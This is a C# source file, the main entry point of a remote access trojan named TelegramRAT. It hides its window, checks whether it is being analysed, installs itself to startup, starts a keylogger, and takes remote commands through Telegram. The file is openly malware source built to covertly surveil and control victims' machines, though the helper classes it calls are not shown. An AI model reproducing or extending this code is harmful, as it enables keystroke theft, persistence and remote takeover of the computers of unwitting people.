using System.Threading;

namespace TelegramRAT
{
    class Program
    {
        static void Main()
        {
            // Since the project output is 'Windows Application', console window is not displayed and remains hidden
            // This means console output is not available
            ProcessManager.CheckIfBeingAnalyzed();
            ProcessManager.InstallAndAddToStartup();

            TelegramAPI tg = new TelegramAPI();
            Thread processChecker = new Thread(() => ProcessManager.ProcessChecker(tg));
            processChecker.Start();

            Thread keyLogger = new Thread(KeyLogger.StartLogging);
            keyLogger.Start();

            tg.SendMessage("I'm online!");
            tg.WaitForCommands();
        }
    }
}
